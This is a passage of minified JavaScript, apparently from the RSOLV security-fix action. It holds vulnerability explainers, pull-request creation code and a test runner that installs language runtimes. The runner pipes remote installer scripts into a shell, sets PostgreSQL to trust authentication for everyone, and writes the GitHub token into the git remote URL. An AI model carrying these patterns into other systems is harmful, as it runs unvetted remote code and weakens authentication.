`)}var KJ,UJ;var eK=$1(()=>{y1();g9();KJ={VALIDATION_TESTS:"## \uD83E\uDDEA Validation Tests",TEST_RESULTS:"##  Test Results",ATTACK_EXAMPLE:"## \uD83C\uDFAF Attack Example",LEARNING_RESOURCES:"## \uD83D\uDCD6 Learning Resources",CHANGES_MADE:"## \uD83D\uDCCA Changes Made",UNDERSTANDING_FIX:"## \uD83D\uDCDA Understanding This Fix",TESTING_INSTRUCTIONS:"## \uD83E\uDDEA Testing Instructions",REVIEW_CHECKLIST:"##  Review Checklist",ABOUT_RSOLV:"## \uD83E\uDD16 About RSOLV",SUMMARY:"## \uD83D\uDCDD Summary"},UJ={XSS:{title:"Cross-Site Scripting (XSS)",description:"XSS allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to session hijacking, defacement, or redirection to malicious sites.",prevention:"Always sanitize user input, use Content Security Policy (CSP), encode output, and validate input on both client and server sides.",example:'`<script>alert("XSS")</script>` becomes `&lt;script&gt;alert("XSS")&lt;/script&gt;`'},SQLi:{title:"SQL Injection",description:"SQL injection allows attackers to interfere with database queries, potentially reading sensitive data, modifying database data, or executing administrative operations.",prevention:"Use parameterized queries/prepared statements, validate input types, apply least privilege principle to database accounts, and avoid dynamic SQL construction.",example:'Instead of `query("SELECT * FROM users WHERE id = " + userId)`, use parameterized: `query("SELECT * FROM users WHERE id = ?", [userId])`'},slopsquatting:{title:"Slopsquatting (AI-Specific Vulnerability)",description:"Slopsquatting exploits AI code generation tools that hallucinate non-existent package names. Attackers register these packages to inject malicious code. Our research shows 19.6% of AI package suggestions are hallucinated.",prevention:"Always verify package existence before adding dependencies, use package registries with verification, and implement dependency scanning in CI/CD pipelines.",example:'AI might suggest `import { validateInput } from "secure-validator"` where "secure-validator" doesn\'t exist, allowing attackers to register it.'},CSRF:{title:"Cross-Site Request Forgery (CSRF)",description:"CSRF tricks authenticated users into executing unwanted actions. An attacker can force users to perform state-changing requests like transferring funds or changing email addresses.",prevention:"Implement anti-CSRF tokens, use SameSite cookie attribute, verify Origin/Referer headers, and require re-authentication for sensitive actions."},XXE:{title:"XML External Entity (XXE) Injection",description:"XXE attacks exploit vulnerabilities in XML parsers to access local or remote files, perform SSRF attacks, or cause denial of service.",prevention:"Disable external entity processing in XML parsers, use less complex data formats like JSON when possible, and validate/sanitize XML input."},CODE_INJECTION:{title:"Code Injection",description:"Code injection allows attackers to inject and execute arbitrary code through user-controlled input passed to dynamic execution functions like eval(), Function(), or vm.runInContext().",prevention:"Never use eval() or similar dynamic code execution with user input. Use safe alternatives like JSON.parse() for data parsing, and implement strict input validation.",example:"Instead of `eval(userInput)`, use `JSON.parse(userInput)` for data or a safe expression evaluator."},PROTOTYPE_POLLUTION:{title:"Prototype Pollution",description:"Prototype pollution allows attackers to modify Object.prototype by injecting properties through __proto__ or constructor.prototype, affecting all objects in the application.",prevention:"Validate and sanitize object keys before assignment. Use Object.create(null) for lookup maps, freeze prototypes, and filter __proto__/constructor keys from user input.",example:'Instead of `obj[key] = value` with user-controlled key, validate: `if (key === "__proto__" || key === "constructor") throw new Error("invalid key")`'},HARDCODED_CREDENTIALS:{title:"Hardcoded Credentials",description:"Hardcoded credentials (passwords, API keys, tokens) in source code can be extracted by attackers who gain access to the codebase, leading to unauthorized access.",prevention:"Store secrets in environment variables or a secrets manager. Never commit credentials to version control. Use .env files locally and secrets management in production.",example:'Instead of `const apiKey = "sk-abc123"`, use `const apiKey = process.env.API_KEY`'},PATH_TRAVERSAL:{title:"Path Traversal",description:"Path traversal allows attackers to access files outside the intended directory by using ../ sequences, potentially reading sensitive system files or configuration.",prevention:"Validate and sanitize file paths, use path.resolve() and verify the resolved path stays within the allowed directory, and avoid passing user input directly to file operations."},COMMAND_INJECTION:{title:"Command Injection",description:"Command injection allows attackers to execute arbitrary system commands by injecting shell metacharacters into user input passed to system command execution functions.",prevention:"Avoid shell execution with user input. Use parameterized commands, execFile() instead of exec(), and validate/escape all user input before passing to system commands.",example:'Instead of `exec("ls " + userDir)`, use `execFile("ls", [userDir])` with proper validation.'},INSECURE_DESERIALIZATION:{title:"Insecure Deserialization",description:"Insecure deserialization allows attackers to execute arbitrary code by manipulating serialized objects, potentially leading to remote code execution or privilege escalation.",prevention:"Never deserialize untrusted data. Use safe deserialization methods (e.g., yaml.safe_load, JSON.parse), implement type checking, and validate serialized data before processing."},SSTI:{title:"Server-Side Template Injection (SSTI)",description:"SSTI allows attackers to inject template directives into server-side templates, potentially achieving remote code execution by exploiting the template engine.",prevention:"Never pass user input directly to template rendering functions. Use sandboxed template engines, pre-compiled templates, and strict input validation."}}});import{execSync as BJ}from"child_process";async function JG(X,Q,J,Y,W){try{V.info(`Creating pull request from commit ${Q.substring(0,8)} for issue #${X.number}`);let G=`rsolv/fix-issue-${X.number}`,H=await rt1(Q,G,Y);if(!H.success)return{success:!1,message:"Failed to push changes",error:H.error};let $=nt1(X,J,W),z=v0(),[U,K]=X.repository.fullName.split("/");try{let B=J.isTestMode&&J.validationFailed?"[TEST MODE] ":"",{data:q}=await z.pulls.create({owner:U,repo:K,title:`${B}[RSOLV] ${J.title} (fixes #${X.number})`,body:$,head:G,base:X.repository.defaultBranch||"main",maintainer_can_modify:!0});if(V.info(`Created pull request #${q.number}: ${q.html_url}`),Y.rsolvApiKey)try{await new _8(Y.rsolvApiKey).createFixAttempt({issueId:X.id,issueNumber:X.number,repository:X.repository.fullName,pullRequestUrl:q.html_url,pullRequestNumber:q.number,branchName:G,commitHash:Q}),V.info("Tracked fix attempt in RSOLV API")}catch(Z){V.warn("Failed to track fix attempt in RSOLV API",Z)}return{success:!0,message:`Created pull request #${q.number}`,pullRequestUrl:q.html_url,pullRequestNumber:q.number,branchName:G,commitHash:Q}}catch(B){if(B.status===422&&B.message?.includes("pull request already exists")){V.warn("Pull request already exists for this branch");let{data:q}=await z.pulls.list({owner:U,repo:K,head:`${U}:${G}`,state:"open"});if(q.length>0){let Z=q[0];return{success:!0,message:`Pull request already exists: #${Z.number}`,pullRequestUrl:Z.html_url,pullRequestNumber:Z.number,branchName:G,commitHash:Q}}}throw B}}catch(G){return V.error("Failed to create pull request from git",G),{success:!1,message:"Failed to create pull request",error:G instanceof Error?G.message:String(G)}}}async function rt1(X,Q,J){try{let Y=J.repoToken||process.env.GITHUB_TOKEN||process.env.GH_PAT;if(Y){let W=process.env.GITHUB_REPOSITORY;if(W){let[G,H]=W.split("/"),$=`https://x-access-token:${Y}@github.com/${G}/${H}.git`;try{BJ(`git remote set-url origin ${$}`,{encoding:"utf-8"}),V.debug("Configured git authentication for push")}catch(z){V.warn("Failed to configure git authentication, will try with default settings")}}}return BJ(`git checkout -b ${Q} ${X}`,{encoding:"utf-8"}),V.info(`Created branch ${Q} from commit ${X.substring(0,8)}`),BJ(`git push origin ${Q}`,{encoding:"utf-8"}),V.info(`Pushed branch ${Q} to origin`),BJ("git checkout -",{encoding:"utf-8"}),{success:!0}}catch(Y){V.error("Failed to push branch",Y);try{BJ("git checkout -",{encoding:"utf-8"})}catch(W){}return{success:!1,error:Y instanceof Error?Y.message:String(Y)}}}function nt1(X,Q,J){let Y=[],W=Q.isTestMode&&Q.validationFailed?"[TEST MODE] ":"";if(Y.push(`# ${W}${Q.title}
`),Q.isTestMode&&Q.validationFailed){if(Y.push(`>  **TEST MODE**: This PR was created despite validation failures to allow inspection of the attempted fix.
`),Y.push(`> 
`),Q.testModeNote)Y.push(`> **Validation Issue:** ${Q.testModeNote}
`);Y.push(`
`),Y.push(`---

`)}if(Y.push(`**Fixes:** #${X.number}
`),Y.push(`## Summary
`),Y.push(Q.description),Y.push(""),J&&J.filesChanged>0)Y.push(`## Changes Made
`),Y.push(`- **Files Changed:** ${J.filesChanged}`),Y.push(`- **Lines Added:** ${J.insertions}`),Y.push(`- **Lines Removed:** ${J.deletions}`),Y.push("");if(Q.vulnerabilityDetails){if(Y.push(`## Security Details
`),Y.push(`- **Vulnerability Type:** ${Q.vulnerabilityDetails.type}`),Y.push(`- **Severity:** ${Q.vulnerabilityDetails.severity}`),Q.vulnerabilityDetails.cwe)Y.push(`- **CWE:** ${Q.vulnerabilityDetails.cwe}`);Y.push("")}if(Q.securityImpact)Y.push(`## Security Impact
`),Y.push(Q.securityImpact),Y.push("");if(Q.tests&&Q.tests.length>0)Y.push(`## Testing Instructions
`),Q.tests.forEach((G,H)=>{Y.push(`${H+1}. ${G}`)}),Y.push("");return Y.push(`## Review Checklist
`),Y.push("- [ ] Changes fix the reported vulnerability"),Y.push("- [ ] No new vulnerabilities introduced"),Y.push("- [ ] Existing functionality preserved"),Y.push("- [ ] Code follows project conventions"),Y.push("- [ ] Tests pass (if applicable)"),Y.push(""),Y.push(`---
`),Y.push("This PR was automatically generated by [RSOLV](https://rsolv.dev) using direct file editing."),Y.push(`Issue: #${X.number}`),Y.join(`
`)}var XV=$1(()=>{y1();g9()});var pC={};Y9(pC,{TestRunner:()=>YG});import{exec as at1}from"child_process";import{promisify as ot1}from"util";import*as m6 from"fs/promises";import*as y0 from"path";class YG{DEFAULT_TIMEOUT=30000;RUNTIME_INSTALL_TIMEOUT=600000;MISE_QUICK_TIMEOUT=300000;bundleInstallFailed=!1;DEP_INSTALL_TIMEOUT=180000;getMiseDataDir(){return process.env.MISE_DATA_DIR||`${process.env.HOME||"/root"}/.local/share/mise`}getMiseShimsPath(){return`${this.getMiseDataDir()}/shims`}pythonTestPrefix="";async runTests(X){let Q=X.timeout??this.DEFAULT_TIMEOUT;try{await this.ensureRuntime(X.framework,X.workingDir)}catch(Y){let W=Y instanceof Error?Y.message:String(Y);return this.createResult(!1,"","",!1,void 0,`Failed to install runtime for ${X.framework}: ${W}`)}try{await this.ensureDependencies(X.framework,X.workingDir)}catch(Y){let W=Y instanceof Error?Y.message:String(Y);return this.createResult(!1,"","",!1,void 0,`Failed to install dependencies for ${X.framework}: ${W}`)}let J=this.buildCommand(X);try{let{stdout:Y,stderr:W}=await I0(J,{cwd:X.workingDir,timeout:Q,encoding:"utf8"});return this.createResult(!0,Y,W,!1,0)}catch(Y){let W=Y;if(W.killed||W.signal==="SIGTERM")return this.createResult(!1,W.stdout||"",W.stderr||"",!0,W.code,"Test execution timed out");return this.createResult(!1,W.stdout||"",W.stderr||"",!1,W.code,W.message)}}async ensureRuntime(X,Q){let J=st1[X];if(J==="node")return;try{await I0(`which ${J}`,{encoding:"utf8"});return}catch{}if(J==="elixir"){console.log("[TestRunner] Elixir requires Erlang - installing Erlang first");try{await I0("which erl",{encoding:"utf8"}),console.log("[TestRunner] Erlang already available")}catch{console.log("[TestRunner] Installing Erlang via mise");try{await I0("mise install erlang@latest && mise use --global erlang@latest",{cwd:Q,timeout:this.RUNTIME_INSTALL_TIMEOUT,encoding:"utf8"}),console.log("[TestRunner] Erlang installed successfully");let H=this.getMiseShimsPath(),$=`${process.env.HOME||"/root"}/.local/bin`,z=process.env.PATH||"";if(!z.includes(H))process.env.PATH=`${H}:${$}:${z}`,console.log(`[TestRunner] Updated PATH after Erlang install: ${H}`)}catch(H){console.warn(`[TestRunner] Erlang install failed: ${H.message}`)}}}if(J==="php"){let H=await this.detectPhpVersionFromComposer(Q);if(H)console.log(`[TestRunner] PHP ${H} required by composer.json - using mise for version matching`);else{console.log("[TestRunner] Trying apt-get for PHP + Composer (faster than building from source)");try{let{stdout:$,stderr:z}=await I0("apt-get update && apt-get install -y php php-cli php-xml php-mbstring php-curl php-zip unzip composer",{cwd:Q,timeout:120000,encoding:"utf8"});if(console.log(`[TestRunner] apt-get output: ${$}`),z)console.log(`[TestRunner] apt-get stderr: ${z}`);await I0("which php",{encoding:"utf8"}),console.log("[TestRunner] PHP installed via apt-get");return}catch($){let z=$;console.log(`[TestRunner] apt-get PHP failed: ${z.stderr||z.message}`),console.log("[TestRunner] Will try mise as fallback")}}}if(J==="java"){let H=await this.detectJavaVersionFromManifest(Q);if(H){console.log(`[TestRunner] Java ${H} required by project - using mise (prebuilt binaries)`);try{let $=`java@temurin-${H}`,{stdout:z,stderr:U}=await I0(`mise install ${$} && mise use --global ${$}`,{cwd:Q,timeout:this.MISE_QUICK_TIMEOUT,encoding:"utf8"});if(console.log(`[TestRunner] mise Java installed: ${z}`),U)console.log(`[TestRunner] mise Java stderr: ${U}`);let K=this.getMiseShimsPath(),B=`${process.env.HOME||"/root"}/.local/bin`,q=process.env.PATH||"";if(!q.includes(K))process.env.PATH=`${K}:${B}:${q}`,console.log(`[TestRunner] Updated PATH to include mise shims: ${K}`);await this.ensureMaven(Q),await I0("javac -version && mvn --version",{encoding:"utf8"}),console.log(`[TestRunner] Java ${H} + Maven installed via mise`);return}catch($){let z=$;console.log(`[TestRunner] mise Java install failed: ${z.stderr||z.message}`),console.log("[TestRunner] Falling back to apt-get")}}console.log(`[TestRunner] Trying apt-get for Java + Maven${H?` (mise failed for temurin-${H})`:" (no version detected)"}`);try{let{stdout:$,stderr:z}=await I0("apt-get update && apt-get install -y default-jdk maven",{cwd:Q,timeout:180000,encoding:"utf8"});if(console.log(`[TestRunner] apt-get output: ${$}`),z)console.log(`[TestRunner] apt-get stderr: ${z}`);if(await I0("which javac && which mvn",{encoding:"utf8"}),console.log("[TestRunner] Java + Maven installed via apt-get"),H)console.log(`[TestRunner] WARNING: System Java may be incompatible with project's Gradle version (needed Java ${H})`);return}catch($){let z=$;console.log(`[TestRunner] apt-get Java failed: ${z.stderr||z.message}`),console.log("[TestRunner] Will try mise as fallback")}}let Y=process.env.RSOLV_RUNTIME_VERSION,W=process.env.RSOLV_RUNTIME_VERSION_SOURCE||"unknown";if(Y){if(console.log(`[TestRunner] [RFC-112] Platform-detected runtime version: ${J}@${Y} (from ${W})`),!Y.match(/^(\d+(?:\.\d+(?:\.\d+)?)?)$/))console.log(`[TestRunner] [RFC-112] Version "${Y}" is a constraint, falling back to local detection`),Y=await this.detectRuntimeVersion(J,Q)||void 0}else Y=await this.detectRuntimeVersion(J,Q)||void 0;if(!Y)try{console.log(`[TestRunner] [RFC-112] No version constraint found, trying mise native resolution for ${J}`),await I0(`mise install ${J} && mise use --global ${J}`,{cwd:Q,timeout:this.RUNTIME_INSTALL_TIMEOUT,encoding:"utf8"});let H=this.getMiseShimsPath(),$=`${process.env.HOME||"/root"}/.local/bin`,z=process.env.PATH||"";if(!z.includes(H))process.env.PATH=`${H}:${$}:${z}`;console.log(`[TestRunner] [RFC-112] mise native resolution succeeded for ${J}`);return}catch{console.log(`[TestRunner] [RFC-112] mise native resolution failed, falling back to ${J}@latest`)}let G=Y?`${J}@${Y}`:`${J}@latest`;console.log(`[TestRunner] Installing runtime: ${G} via mise`);try{let H=`mise install ${G} && mise use --global ${G}`;if(J==="elixir"){let Z=this.getMiseShimsPath();H=`PATH="${Z}:$PATH" ${H}`,console.log(`[TestRunner] Using PATH prefix for Elixir install: ${Z}`)}let $=Y?this.MISE_QUICK_TIMEOUT:this.RUNTIME_INSTALL_TIMEOUT,{stdout:z,stderr:U}=await I0(H,{cwd:Q,timeout:$,encoding:"utf8"});if(console.log(`[TestRunner] Runtime installed: ${z}`),U)console.log(`[TestRunner] Runtime install stderr: ${U}`);let K=this.getMiseShimsPath(),B=`${process.env.HOME||"/root"}/.local/bin`,q=process.env.PATH||"";if(!q.includes(K))process.env.PATH=`${K}:${B}:${q}`,console.log(`[TestRunner] Updated PATH to include mise shims: ${K}`);if(J==="php"){console.log("[TestRunner] Installing Composer for mise PHP");try{await I0("curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer",{cwd:Q,timeout:60000,encoding:"utf8"}),console.log("[TestRunner] Composer installed successfully")}catch(Z){console.warn(`[TestRunner] Composer install warning: ${Z.message}`)}}}catch(H){let $=H,z=$.killed||$.message&&$.message.includes("TIMEOUT"),U=$.stderr||$.message||String(H);if(console.warn(`[TestRunner] mise install failed: ${U.slice(0,200)}`),J==="php"||J==="ruby"||J==="python"){let K=z?`timed out after ${this.MISE_QUICK_TIMEOUT}ms`:"failed";console.warn(`[TestRunner] mise install ${K} - falling back to apt-get`),console.warn(`[TestRunner] Note: System version may differ from project's required ${G}`);let B={php:"php php-cli php-xml php-mbstring php-curl php-zip unzip composer",ruby:"ruby ruby-dev bundler",python:"python3 python3-pip python3-venv"};try{let{stdout:q,stderr:Z}=await I0(`apt-get update && apt-get install -y ${B[J]}`,{cwd:Q,timeout:120000,encoding:"utf8"});if(console.log(`[TestRunner] apt-get fallback output: ${q}`),Z)console.log(`[TestRunner] apt-get fallback stderr: ${Z}`);await I0(`which ${J==="python"?"python3":J}`,{encoding:"utf8"}),console.log(`[TestRunner] ${J} installed via apt-get fallback (may differ from project version)`);return}catch(q){let Z=q;throw Error(`mise install ${G} timed out and apt-get fallback failed: ${Z.stderr||Z.message}`)}}throw Error(`mise install ${G} failed: ${$.stderr||$.message}`)}}async detectRuntimeVersion(X,Q){let J=tt1[X]||[];for(let Y of J)try{let W=y0.join(Q,Y),G=(await m6.readFile(W,"utf8")).trim();if(Y===".tool-versions"){let H=G.match(new RegExp(`^${X}\\s+(.+)$`,"m"));if(H)return H[1].trim()}else return G}catch{}if(X==="php"){let Y=await this.detectPhpVersionFromComposer(Q);if(Y)return Y}return}async detectPhpVersionFromComposer(X){try{let Q=y0.join(X,"composer.json"),J=await m6.readFile(Q,"utf8"),W=JSON.parse(J)?.require?.php;if(!W)return;let G=W.match(/(\d+)\.(\d+)/);if(G){let H=G[1],$=G[2];return console.log(`[TestRunner] Detected PHP ${H}.${$} requirement from composer.json`),`${H}.${$}`}}catch{}return}async detectJavaVersionFromManifest(X){try{let Q=y0.join(X,"pom.xml"),J=await m6.readFile(Q,"utf8"),Y=J.match(/<java\.version>\s*(\d+)\s*<\/java\.version>/);if(Y)return console.log(`[TestRunner] Detected Java ${Y[1]} from pom.xml <java.version>`),Y[1];let W=J.match(/<maven\.compiler\.source>\s*(\d+)\s*<\/maven\.compiler\.source>/);if(W)return console.log(`[TestRunner] Detected Java ${W[1]} from pom.xml <maven.compiler.source>`),W[1];let G=J.match(/<release>\s*(\d+)\s*<\/release>/);if(G)return console.log(`[TestRunner] Detected Java ${G[1]} from pom.xml <release>`),G[1]}catch{}try{let Q=y0.join(X,"build.gradle"),J=await m6.readFile(Q,"utf8");J=J.replace(/\/\*[\s\S]*?\*\//g,"").replace(/\/\/.*$/gm,"");let Y=J.match(/sourceCompatibility\s*=\s*(?:JavaVersion\.VERSION_)?['"]*(?:1\.)?(\d+)['"']*/);if(Y)return console.log(`[TestRunner] Detected Java ${Y[1]} from build.gradle sourceCompatibility`),Y[1];let W=J.match(/JavaLanguageVersion\.of\((\d+)\)/);if(W)return console.log(`[TestRunner] Detected Java ${W[1]} from build.gradle toolchain`),W[1]}catch{}try{let Q=y0.join(X,"build.gradle.kts"),J=await m6.readFile(Q,"utf8"),Y=J.match(/JavaLanguageVersion\.of\((\d+)\)/);if(Y)return console.log(`[TestRunner] Detected Java ${Y[1]} from build.gradle.kts toolchain`),Y[1];let W=J.match(/sourceCompatibility\s*=\s*JavaVersion\.VERSION_(\d+)/);if(W)return console.log(`[TestRunner] Detected Java ${W[1]} from build.gradle.kts sourceCompatibility`),W[1]}catch{}return}async ensureMaven(X){try{await I0("which mvn",{encoding:"utf8"}),console.log("[TestRunner] Maven already available");return}catch{}console.log("[TestRunner] Installing Maven via apt-get");try{await I0("apt-get update && apt-get install -y maven",{cwd:X,timeout:120000,encoding:"utf8"}),await I0("which mvn",{encoding:"utf8"}),console.log("[TestRunner] Maven installed via apt-get")}catch(Q){let J=Q;console.log(`[TestRunner] Maven install failed: ${J.stderr||J.message}`)}}async detectPythonInstaller(X){if(await this.fileExists(y0.join(X,"uv.lock")))return"uv-project";if(await this.fileExists(y0.join(X,"poetry.lock")))return"poetry";if(await this.fileExists(y0.join(X,"Pipfile.lock")))return"pipenv";if(await this.fileExists(y0.join(X,"Pipfile")))return"pipenv";return"uv"}async ensureUv(){try{return await I0("which uv",{encoding:"utf8"}),!0}catch{try{console.log("[TestRunner] Installing uv for Python package management..."),await I0("curl -LsSf https://astral.sh/uv/install.sh | sh",{timeout:60000,encoding:"utf8"});let X="/root/.local/bin";if(!process.env.PATH?.includes(X))process.env.PATH=`${X}:${process.env.PATH}`;return await I0("uv --version",{encoding:"utf8"}),console.log("[TestRunner] uv installed successfully"),!0}catch(X){return console.warn(`[TestRunner] Failed to install uv: ${X.message}`),!1}}}async needsPostgresql(X){try{let Q=y0.join(X,"mix.exs");await m6.access(Q);let J=await m6.readFile(Q,"utf8");return/\{:postgrex\b|\{:ecto_sql\b/.test(J)}catch{return!1}}async ensurePostgresql(X){let Q="app";try{let W=y0.join(X,"mix.exs"),H=(await m6.readFile(W,"utf8")).match(/app:\s*:(\w+)/);if(H)Q=H[1]}catch{}let J=`${Q}_test`;console.log(`[TestRunner] Provisioning PostgreSQL for ${Q} (database: ${J})`);let Y=!1;try{await I0("pg_isready",{encoding:"utf8",timeout:5000}),Y=!0,console.log("[TestRunner] PostgreSQL already running")}catch{}if(!Y){console.log("[TestRunner] Configuring PostgreSQL trust authentication...");try{await I0(`for f in /etc/postgresql/*/main/pg_hba.conf; do
            if [ -f "$f" ]; then
              echo "local all all trust" > "$f"
              echo "host all all 127.0.0.1/32 trust" >> "$f"
              echo "host all all ::1/128 trust" >> "$f"
            fi
          done`,{encoding:"utf8",timeout:1e4})}catch(W){console.warn(`[TestRunner] pg_hba.conf update warning: ${W.message}`)}console.log("[TestRunner] Starting PostgreSQL...");try{await I0("pg_ctlcluster 17 main start || pg_ctlcluster 16 main start || pg_ctlcluster 15 main start",{encoding:"utf8",timeout:30000})}catch{try{await I0("pg_ctl start -D /var/lib/postgresql/data -l /var/log/postgresql/startup.log",{encoding:"utf8",timeout:30000})}catch(W){throw console.warn(`[TestRunner] PostgreSQL start failed: ${W.message}`),Error("Failed to start PostgreSQL")}}for(let W=0;W<5;W++)try{await I0("pg_isready",{encoding:"utf8",timeout:5000}),Y=!0,console.log(`[TestRunner] PostgreSQL ready (attempt ${W+1})`);break}catch{await new Promise((G)=>setTimeout(G,1000))}if(!Y)throw Error("PostgreSQL failed to become ready after 5 attempts")}try{await I0("createuser -s postgres 2>/dev/null || true",{encoding:"utf8",timeout:1e4}),await I0(`createdb -U postgres ${J} 2>/dev/null || true`,{encoding:"utf8",timeout:1e4}),console.log(`[TestRunner] Database ${J} ready`)}catch(W){console.warn(`[TestRunner] Database setup warning: ${W.message}`)}process.env.DATABASE_URL=`postgresql://postgres:postgres@localhost/${J}`,process.env.MIX_ENV="test",console.log(`[TestRunner] DATABASE_URL set to postgresql://postgres:postgres@localhost/${J}`)}async ensureDependencies(X,Q){let J=await this.getDependencyCommand(X,Q);if(!J)return;console.log(`[TestRunner] Installing dependencies: ${J}`);try{let{stdout:Y,stderr:W}=await I0(J,{cwd:Q,timeout:this.DEP_INSTALL_TIMEOUT,encoding:"utf8"});if(console.log(`[TestRunner] Dependencies installed: ${Y.slice(0,500)}`),W)console.log(`[TestRunner] Dep install stderr: ${W.slice(0,500)}`)}catch(Y){let W=Y;if(console.warn(`[TestRunner] Dependency install warning: ${W.stderr||W.message}`),X==="rspec"||X==="minitest"){let G=X==="rspec"?"rspec":"minitest";console.log(`[TestRunner] bundle install failed, falling back to: gem install ${G}`);try{await I0(`gem install ${G}`,{cwd:Q,timeout:this.DEP_INSTALL_TIMEOUT,encoding:"utf8"}),this.bundleInstallFailed=!0,console.log(`[TestRunner] ${G} installed directly via gem install`)}catch(H){console.warn(`[TestRunner] gem install ${G} also failed: ${H.message}`)}}}}async getDependencyCommand(X,Q){switch(X){case"rspec":case"minitest":{if(await this.fileExists(y0.join(Q,"Gemfile")))return"BUNDLE_IGNORE_RUBY_VERSION=1 bundle install";return null}case"pytest":{let Y=await this.detectPythonInstaller(Q),W=await this.ensureUv();console.log(`[TestRunner] Python installer: ${Y}${!W?" (uv unavailable, using pip)":""}`);let G=W?"uv pip install --system --break-system-packages":"python3 -m pip install --break-system-packages";if(Y==="uv-project")return this.pythonTestPrefix="uv run ","apt-get update && apt-get install -y --no-install-recommends libjpeg-dev libpng-dev libfreetype-dev 2>/dev/null || true && uv sync && uv pip install pytest";if(Y==="poetry")return this.pythonTestPrefix="poetry run ",`apt-get update && apt-get install -y --no-install-recommends libjpeg-dev libpng-dev libfreetype-dev 2>/dev/null || true && ${`(which poetry > /dev/null 2>&1 || ${G} poetry)`} && poetry install && poetry run pip install pytest`;if(Y==="pipenv")return this.pythonTestPrefix="pipenv run ",`apt-get update && apt-get install -y --no-install-recommends libjpeg-dev libpng-dev libfreetype-dev 2>/dev/null || true && ${`(which pipenv > /dev/null 2>&1 || ${G} pipenv)`} && pipenv install && pipenv run pip install pytest`;this.pythonTestPrefix="";let H=`${G} pytest`;if(await this.fileExists(y0.join(Q,"requirements.txt")))return`apt-get update && apt-get install -y --no-install-recommends libjpeg-dev libpng-dev libfreetype-dev 2>/dev/null || true && (${G} -r requirements.txt || echo "Some deps failed, continuing...") && ${H}`;if(await this.fileExists(y0.join(Q,"pyproject.toml")))return`apt-get update && apt-get install -y --no-install-recommends libjpeg-dev libpng-dev libfreetype-dev 2>/dev/null || true && (${G} -e . || echo "Install failed, continuing...") && ${H}`;if(await this.fileExists(y0.join(Q,"setup.py")))return`apt-get update && apt-get install -y --no-install-recommends libjpeg-dev libpng-dev libfreetype-dev 2>/dev/null || true && (${G} -e . || echo "Install failed, continuing...") && ${H}`;return H}case"phpunit":{if(await this.fileExists(y0.join(Q,"composer.json"))){if(await this.fileExists(y0.join(Q,"vendor","autoload.php")))return null;return"composer install --ignore-platform-reqs"}return null}case"junit":return null;case"exunit":{if(await this.fileExists(y0.join(Q,"mix.exs"))){if(await this.needsPostgresql(Q))return await this.ensurePostgresql(Q),"MIX_ENV=test mix deps.get && MIX_ENV=test mix deps.compile && MIX_ENV=test mix ecto.create && MIX_ENV=test mix ecto.migrate";return"MIX_ENV=test mix deps.get && MIX_ENV=test mix deps.compile"}return null}case"testing":{if(await this.fileExists(y0.join(Q,"go.mod")))return"go mod download";return null}case"jest":case"vitest":case"mocha":{if(await this.fileExists(y0.join(Q,"node_modules")))return null;if(await this.fileExists(y0.join(Q,"bun.lockb")))return"bun install";if(await this.fileExists(y0.join(Q,"package-lock.json")))return"npm ci";if(await this.fileExists(y0.join(Q,"yarn.lock")))return"yarn install --frozen-lockfile";if(await this.fileExists(y0.join(Q,"package.json")))return"npm install";return null}default:return null}}async fileExists(X){try{return await m6.access(X),!0}catch{return!1}}buildCommand(X){let{framework:Q,testFile:J,testName:Y}=X,W=this.getCommandPattern(Q);return this.buildCommandFromPattern(W,J,Y)}getCommandPattern(X){let J={jest:{base:"npx jest",testNameFlag:"-t"},vitest:{base:"npx vitest run",testNameFlag:"-t"},mocha:{base:"npx mocha",testNameFlag:"--grep"},rspec:{base:this.bundleInstallFailed?"rspec":"BUNDLE_IGNORE_RUBY_VERSION=1 bundle exec rspec",testNameFlag:"-e"},minitest:{base:this.bundleInstallFailed?"ruby":"BUNDLE_IGNORE_RUBY_VERSION=1 ruby",testNameFlag:"-n"},pytest:{base:`${this.pythonTestPrefix}pytest`,testNameFlag:"-k"},phpunit:{base:"vendor/bin/phpunit",testNameFlag:"--filter"},junit:{base:"mvn test",testNameFlag:"-Dtest"},junit5:{base:"mvn test",testNameFlag:"-Dtest"},junit4:{base:"mvn test",testNameFlag:"-Dtest"},testing:{base:"go test",testNameFlag:"-run"},exunit:{base:"mix test",testNameFlag:"--only"}}[X];if(!J)throw Error(`Unsupported test framework: ${X}`);return J}buildCommandFromPattern(X,Q,J){if(X.base.startsWith("mvn ")){let G=(Q.split("/").pop()||Q).replace(/\.java$/,""),H=`${X.base} ${X.testNameFlag}="${G}"`;if(J)H=`${X.base} ${X.testNameFlag}="${G}#${J}"`;return H}let Y=`${X.base} "${Q}"`;if(J)Y+=` ${X.testNameFlag} "${J}"`;return Y}createResult(X,Q,J,Y,W,G){return{passed:X,output:Q,stderr:J,timedOut:Y,exitCode:W,error:G}}}var I0,st1,tt1;var QV=$1(()=>{I0=ot1(at1),st1={jest:"node",vitest:"node",mocha:"node",rspec:"ruby",minitest:"ruby",pytest:"python",phpunit:"php",junit:"java",junit5:"java",junit4:"java",testing:"go",exunit:"elixir"},tt1={ruby:[".ruby-version",".tool-versions"],python:[".python-version",".tool-versions"],node:[".node-version",".nvmrc",".tool-versions"],java:[".java-version",".tool-versions"],go:[".go-version",".tool-versions"],elixir:[".tool-versions"],php:[".php-version",".tool-versions"]}});function Xe1(X){if(!X)return"unknown";let Q=et1[X.toLowerCase()];if(Q)return Q;if(/^[a-z0-9_-]+$/.test(X))return X;if(X.includes("_"))return X.toLowerCase();return X.toLowerCase().replace(/\s+/g,"_").replace(/[()]/g,"")}function Qe1(X){let Q={files:[]};if(!X||typeof X!=="string")return V.warn("[VulnerabilityExtraction] Invalid issue body provided"),Q;let J=X.match(/\*\*Type\*\*:\s*(.+)/);if(J)Q.type=J[1].trim();let Y=X.match(/\*\*Severity\*\*:\s*(\S+)/);if(Y)Q.severity=Y[1];let W=X.match(/\*\*CWE\*\*:\s*\[?(CWE-\d+)\]?/);if(W)Q.cweId=W[1];let G=X.split(`
